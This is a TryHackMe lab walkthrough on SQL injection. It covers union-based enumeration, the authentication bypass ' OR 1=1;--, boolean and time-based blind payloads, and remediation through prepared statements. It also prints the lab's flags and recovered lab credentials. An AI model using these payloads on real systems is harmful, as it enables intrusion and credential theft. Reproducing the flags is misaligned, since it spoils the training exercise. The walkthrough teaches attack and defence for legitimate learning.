# 🌐 TryHackMe — SQL Injection (SQLi) Walkthrough

This comprehensive guide covers the mechanics of SQL Injection (SQLi), detailing how attackers exploit flawed input validation to execute arbitrary commands inside a relational database, bypass authentication, and exfiltrate sensitive data.

---

## 🔍 Core Classifications of SQLi

SQL Injection attacks generally fall into three distinct architectural categories based on how the application handles data extraction and error states:

*   **In-Band (Union-Based) SQLi:** The most straightforward technique where the attacker uses the `UNION` operator to combine malicious queries with the application's legitimate query, forcing the database to display the exfiltrated data directly on the web page.
*   **Error-Based SQLi:** Exploits detailed database error messages generated by the back-end when an invalid query is processed. These system-level errors leak critical information about the database schema, table names, and column structures.
*   **Blind SQLi (Inferential):** Occurs when the application is vulnerable but does not return any data or error messages directly in the HTTP response. Attackers must reconstruct data character-by-character using side-channel analysis:
    *   **Boolean-Based:** Inferring truth values based on changes in the application's visible layout or structure (True vs. False states).
    *   **Time-Based:** Using specific database functions (like `SLEEP()`) to inject delays. The time delta in the server's response confirms whether the conditional statement was true.

## 🔬 Lab Walkthroughs (Tasks 5 - 8)

### 📊 Task 5: Union-Based Data Exfiltration
The target application accepts a parameter via the URL query string (e.g., `?id=1`). The extraction methodology follows a strict sequence:

1.  **Column Counting:** Injecting null or incremental values until the application renders normally without a database breakdown.
```sql
    UNION SELECT 1,2,3; --
    ```
2.  **Nullifying the Primary Query:** Changing the original parameter to an invalid or non-existent value (e.g., `id=0`) to ensure only our injected query outputs data to the screen.
3.  **Database Enumeration:** Discovering the active database schema name.
```sql
    UNION SELECT 1,2,database(); --
    ```
    *   *Extracted Database Name:* `sqli_one`
4.  **Table Enumeration:** Querying the `information_schema` system table to list layout structures.
```sql
    UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'; --
    ```
5.  **Data Exfiltration:** Targeting specific application user credentials.
```sql
    UNION SELECT 1,2,group_concat(password) FROM staff_users WHERE username = 'martin'; --
    ```

*   **[Flag 5.1]** Target Flag for Task 5:
    *   **Answer:** `THM{SQL_INJECTION_3840}`

### 🔑 Task 6: Authentication Bypass
The vulnerability exists in a login form text field, where parameters are handled unsafely in the back-end string concatenation:

```sql
-- VULNERABLE QUERIED STRING
SELECT * FROM users WHERE username = 'USER_INPUT' AND password = 'PASSWORD_INPUT' LIMIT 1;
```

By passing a tautology (`OR 1=1`) and closing the quotation syntax, the rest of the password evaluation block is completely neutralized using SQL comment tags (`--` or `;--`):

```sql
-- ATTACK VECTOR PASSED INTO THE USERNAME FIELD
' OR 1=1;--
```

*   **[Flag 6.1]** Target Flag for Task 6:
    *   **Answer:** `THM{SQL_INJECTION_9581}`

### 👁️ Task 7: Boolean-Based Blind SQLi
In this scenario, the application returns a generic binary state (such as a "True" or "False" indicator) rather than direct data output. Data must be systematically guessed character-by-character using wildcard operators (`LIKE`) or string substring slicing:

```sql
-- ENUMERATING THE DATABASE SCHEMA NAME LETTER BY LETTER
UNION SELECT 1,2,3 WHERE database() LIKE 's%'; --
UNION SELECT 1,2,3 WHERE database() LIKE 'sq%'; --
```
*   *Discovered Schema Name:* `sqli_three`

```sql
-- ENUMERATING THE USERNAME AND TARGET PASSWORDS
UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%'; --
UNION SELECT 1,2,3 FROM users WHERE username = 'admin' AND password LIKE '1%'; --
```
*   *Recovered Credentials:* `admin` / `3845`

*   **[Flag 7.1]** Target Flag for Task 7:
    *   **Answer:** `THM{SQL_INJECTION_1093}`

### ⏱️ Task 8: Time-Based Blind SQLi
When the web application strips out distinct visual "True/False" indicators and returns a completely identical output regardless of query validity, timing side-channels must be used. The `SLEEP()` function is paired with structural operators to verify injection execution hooks:

```sql
-- PROOF OF CONCEPT FOR TIME-BASED COUPLING
UNION SELECT SLEEP(5),2;--
```

If the HTTP connection hangs for exactly 5 seconds before closing, the SQL parameter evaluation engine is vulnerable. This condition is scaled up horizontally to guess characters:
*   *Extracted Database:* `sqli_four`
*   *Target Table:* `users`
*   *Recovered Credentials:* `admin` / `4961`

*   **[Flag 8.1]** Target Flag for Task 8:
    *   **Answer:** `THM{SQL_INJECTION_MASTER}`

## 🛡️ Remediation Framework

To secure backend codebases against SQL Injection vulnerabilities:

*   **Use Prepared Statements (Parameterized Queries):** Forces the database driver to treat user input strictly as data parameters rather than raw executable code.
```php
    // SECURE PDO IMPLEMENTATION
    $stmt = $pdo->prepare('SELECT * FROM users WHERE username = :user');
    $stmt->execute(['user' => $userInput]);
    ```
*   **Stored Procedures:** Parameterize input blocks directly on the schema engine layers.
*   **Enforce Strict Whitelisting:** Validate input syntax against highly predictable patterns (e.g., ensuring IDs are strictly numerical digits).
